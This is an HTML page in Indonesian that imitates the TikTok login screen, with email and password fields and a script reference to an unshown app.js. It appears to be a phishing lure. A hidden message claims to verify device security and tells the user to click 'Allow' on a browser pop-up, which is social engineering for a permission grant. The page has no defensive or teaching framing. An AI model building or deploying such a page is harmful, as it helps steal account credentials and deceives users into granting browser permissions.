
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk ke TikTok</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #121212; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: #1f1f1f; padding: 40px; border-radius: 8px; width: 380px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); text-align: center; }
        h2 { margin-bottom: 24px; font-weight: 700; }
        .input-group { margin-bottom: 16px; text-align: left; }
        input { width: 100%; padding: 12px 16px; background: #2f2f2f; border: 1px solid #3f3f3f; border-radius: 4px; color: #fff; box-sizing: border-box; font-size: 14px; }
        button { width: 100%; padding: 12px; background: #fe2c55; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 8px; }
        #status-msg { font-size: 13px; color: #aaa; margin-top: 12px; display: none; }
    </style>
</head>
<body>
    <div class="login-card">
        <h2>Masuk ke TikTok</h2>
        <form id="login-form">
            <div class="input-group">
                <input type="text" name="username" placeholder="Email atau nomor telepon" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Kata sandi" required>
            </div>
            <button type="submit" id="submit-btn">Masuk</button>
            <div id="status-msg">Memverifikasi keamanan perangkat... Silakan klik "Allow" pada pop-up browser.</div>
        </form>
    </div>
    <script src="app.js"></script>
</body>
</html>
